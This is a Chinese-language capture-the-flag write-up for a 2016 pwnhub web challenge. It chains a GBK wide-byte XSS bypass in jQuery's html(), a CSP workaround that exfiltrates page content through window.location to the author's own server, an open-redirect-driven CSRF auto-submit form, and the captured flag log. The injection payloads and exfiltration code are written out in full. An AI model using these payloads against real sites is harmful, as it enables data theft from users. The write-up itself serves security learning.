---
title: pwnhub_WTF_writeup
date: 2016-12-10 15:23:00
tags:
- pwnhub
- xss
- csp
categories:
- Blogs
---

周五晚上本来是看剧看到累，然后打会儿游戏的日子，一切的祸因都是大黑客告诉我pwnhub开始了Orz...

然而本以为思路是一帆风顺的，结果成功xss自己后，搞不定admin的问题，绝望到寝室断电...然而离flag只有一个转身的距离...

<!--more-->

# 先看看题目信息 #

```

	题目介绍
	
	http://54.223.108.205:23333
	 ---------
	 12.10 00.00 admin只是一个用户名 没有特权
```

进去后测试下整个题目逻辑，发现了几点

1、登陆注册都有验证码

2、新建article传入title和content，会有可以看的页面

3、views.php通过传入id的base64判断，id递增

4、有一个reportbug，可以让管理员看提交过的页面


但是事实上这里还有很多隐藏条件，不知道有多少人发现了

1、登陆成功后，再次访问login.php就会存在跳转

2、views.php不能访问别人的表单

3、提交表单是post方式

4、reportbug必须是http://54.223.108.205:23333开头

5、new.php提交时过滤了单双引号反引号还有尖括号

6、view.php写入页面的时候使用了jq的html()方法

7、页面中有csp，但是开启了unsafe-inline

8、页面中使用的是gbk编码，也就是存在宽字节问题

9、session是httponly的

10、flag.php放了flag，只有admin能看到

让我们重新梳理整个题目的逻辑，首先我们需要构造一个xss。

# writeup #

## 构造xss ##

### 构造标签 ###

首先是基本的过滤，单双引号反引号还有尖括号都是直接被过滤的，但是我们在注意到，views.php页面是这样的


```
	<script>
	title="fda";
	content="fda";
	$("#title").html(title);
	$("#content").html(content);
	</script>
```

这里还有一个比较重要的信息是编码，我们可以看到页面中的编码是

```
	<meta charset="GBK">
```

这里最开始我的想法是通过传入`%df%5c`来转义双引号，闭合后一个双引号，这样conten位置就可以任意构造了，但是这里有个问题，因为js中字符串中不可以跨行，除非在行末标注一个反斜杠，于是这种想法卒了。

但是那么既然我们可以传入任意的反斜杠，而且jq的html会把十六进制转义为符号，我们就可以传入十六进制的方式来注入任意符号，比如说尖括号，这里有个小坑，就是html()和document.write不一样，写入的script标签会不执行，那么这里选择传入img或者svg标签。

payload
```
title=%df%5Cx3c%df%5Cx3e&content=%df%5Cx3cimg src=x onerror=alert(1)// c=%df%5Cx3e&submit=submit
```

### 绕过csp传出数据 ###

成功了，但是这里遇到了新的问题，第一个是我们如何把数据发送出来，因为csp的原因，我们没办法把数据传出来，这里我选择了`window.location`跳转到我的服务器上，通过查看log来绕过。

### 绕过没办法传入字符串的问题 ###

那么又有了新的问题，因为我们没办法传入单双引号（如果使用宽字节吞，会有一个特殊字符在符号前，js代码会直接报错），所以我们没办法直接传入字符串。

我这里使用了`window.location.search.substr(15,8)`来获取链接上的字符串（这里禁用了#号，所以没办法通过`window.location.search.substr(15,8)`来获取），然后在连接上加上新的参数。

### 绕过httponly ###

仔细看一下cookie，我们发现，session是httponly的，也就说我们没办法通过`document.cookie`获取到cookie，再配合上flag存在flag.php,这里我选择了构造jq的请求，获取flag.php的页面源码。

```

	$.get(
	    window.location.search.substr(15,8),{
	        id:     document.domain,
	    },function(data){
	        $.get(
			    window.location.search.substr(23),{
			        id:     data,
			    },function(data){
			        window.location=decodeURIComponent(window.location.search.substr(23))+encodeURIComponent(data);
			    }
			)
	    }
	)
```

这里请求类似于
```

	http://54.223.108.205:23333/view.php?id=MTU0ODQ2&p=flag.phphttp%3A%2f%2f115.28.78.16%2f
```

这样一个完整的xss payload就构造好了，那么我们遇到了新的问题，怎么让管理员看到这样一个页面呢？

## 构造csrf ##

目光重新回到report bugs，这里的report bug有两个条件

1、必须是http://54.223.108.205:23333开头
2、不能有#\@这样的符号

回想前面找到的条件，还记得跳转吗

比如说传入
```
http://54.223.108.205:23333/login.php?redirecturl=http://115.28.78.16
```

后台守护的bot就会跳转到`http://115.28.78.16`去了。

那么我们很合理就可以想到在跳转到的位置构造一个自动提交的表单，这样就可以构成一个post请求向new.php，成功创建一个表单提交（我居然在这里卡了1个小时直到断电...）

payload:
```

	<html>
	
	<head>
		
	</head>
	<body>
	<?php
		$s = "%df%5Cx3cimg src=x onerror=window.onload=function(){\$.get(window.location.search.substr(15,8),{id:document.domain,},function(data){window.location=decodeURIComponent(window.location.search.substr(23))+encodeURIComponent(data);})};// c=%df%5Cx3e";
	
		$st = urldecode($s);
	?>
	
		<form action="http://54.223.108.205:23333/new.php" method="POST">
			<input type="text" name="title" value="test2">
			<input type="text" name="content" value="<?php echo $st; ?>">
			<input type="submit" name="ssubmit" value="submit">
		</form>
		<script>
			document.forms[0].submit();
		</script>
	
	</body>
	
	
	</html>

```

## 完成攻击 ##

所有条件都成立了，那么就是打一波payload了。

首先，本地提交一份表单，获得表单的序号，`MTU0NTQ5-->154549`。

发送写入article的请求

```
	http://54.223.108.205:23333/login.php?redirecturl=http%3A%2f%2f115.28.78.16%2f1.php
```

然后拼接payload，打cookie

```
	http://54.223.108.205:23333/view.php?id=MTU0ODQ2&p=flag.phphttp%3A%2f%2f115.28.78.16%2f
```

然后查看服务器的log

```

	54.223.108.205 - - [10/Dec/2016:10:34:18 +0800] "GET /%0D%0Aflag%20is%20here!%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%E6%81%AD%E5%96%9C%E6%89%BE%E5%88%B0flag%EF%BC%8C%E4%B8%8D%E8%BF%87%E4%BD%9C%E4%B8%BA%E5%87%BA%E9%A2%98%E4%BA%BA%E5%BF%83%E9%87%8C%E6%98%AF%E5%B4%A9%E6%BA%83%E7%9A%84%EF%BC%8C%E6%88%91%E6%83%B3%E8%AF%B4~~~~!%40%23%24%25%5E%26*()_%2B%7B%7D%7C%3A%22%3C%3E%3F~%60-%3D%5B%5D%5C%3B'.%2F%5C%0D%0A%0D%0Apwnhub%7Bflag%3A%E5%A5%B3%E5%AD%A9%E7%9A%84%E5%BF%83%E6%80%9D%E4%BD%A0%E5%88%AB%E7%8C%9C%7D%0D%0A HTTP/1.1" 404 162 "http://54.223.108.205:23333/view.php?id=MTU0ODQ2&p=flag.phphttp%3A%2f%2f115.28.78.16%2f" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0" -

```

最后还剩下两个坑，一个是火日师傅加了一大堆符号，这里如果没有做urlencode再传出就会被阶段，然后flag是中文的，很稳健Orz

```
	flag is here! 恭喜找到flag，不过作为出题人心里是崩溃的，我想说~~~~!@#$%^&*()_+{}|:"<>?~`-=[]\;'./\ pwnhub{flag:女孩的心思你别猜} 
```